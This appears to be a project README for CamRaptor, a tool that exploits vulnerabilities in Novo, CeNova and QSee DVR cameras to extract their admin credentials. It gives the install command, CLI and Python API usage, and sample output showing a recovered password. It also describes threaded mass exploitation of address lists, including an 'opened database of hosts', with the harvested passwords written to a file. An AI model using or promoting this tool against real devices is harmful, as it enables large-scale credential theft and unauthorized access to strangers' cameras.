# CamRaptor

CamRaptor is a tool that exploits several vulnerabilities in popular DVR cameras to obtain device credentials.

## Features

* Exploits vulnerabilities in most popular camera models such as `Novo`, `CeNova` and `QSee`.
* Optimized to exploit multiple cameras at one time from list with threading enabled.
* Simple CLI and API usage.

## Installation

```shell
pip3 install git+https://github.com/EntySec/CamRaptor
```

## Basic usage

To use CamRaptor just type `camraptor` in your terminal.

```
usage: camraptor [-h] [--threads] [--output OUTPUT] [--input INPUT]
                 [--address ADDRESS]

CamRaptor is a tool that exploits several vulnerabilities in popular DVR
cameras to obtain device credentials.

optional arguments:
  -h, --help         show this help message and exit
  --threads          Use threads for fastest work.
  --output OUTPUT    Output result to file.
  --input INPUT      Input file of addresses.
  --address ADDRESS  Single address.
```

### Examples

Let's hack my camera just for fun.

```shell
camraptor --address 192.168.99.100
```

**output:**

```shell
[*] (192.168.99.100) - connecting to device...
[*] (192.168.99.100) - accessing device rom...
[*] (192.168.99.100) - extracting camera credentials...
[i] (192.168.99.100) - admin:mamahacker123
```

Let's try to use opened database of hosts with `--threads` for fast exploitation.

```shell
camraptor --threads --input cameras.txt --output passwords.txt
```

It will exploit all cameras in `cameras.txt` list by their addresses and save all obtained passwords to `passwords.txt`.

**output:**

```shell
[*] Initializing thread #0...
[*] (x.x.x.x) - connecting to camera...
[*] Initializing thread #1...
[*] (x.x.x.x) - connecting to camera...
[*] Initializing thread #2...
[*] (x.x.x.x) - connecting to camera...
[*] (x.x.x.x) - accessing camera config...
[*] (x.x.x.x) - extracting camera credentials...
[i] Thread #0 completed.
[*] (x.x.x.x) - connecting to camera...
[*] (x.x.x.x) - accessing camera config...
[*] (x.x.x.x) - extracting camera credentials...
[i] Thread #1 completed.
[*] (x.x.x.x) - connecting to camera...
[*] (x.x.x.x) - accessing camera config...
[*] (x.x.x.x) - extracting camera credentials...
[i] Thread #2 completed.
```

## CamRaptor API

CamRaptor also has their own Python API that can be invoked by importing CamRaptor to your code:

```python
from camraptor import CamRaptor
```

### Basic functions

There are all CamRaptor basic functions that can be used to exploit specified device.

* `connect(host)` - Connect specified defice by netword address.
* `exploit(device)` - Exploit connected device.

### Examples

```python
from camraptor import CamRaptor

camraptor = CamRaptor()

camera = camraptor.connect('192.168.99.100')
print(camraptor.exploit(camera))
```

**output:**

```shell
'mamahacker123'
```
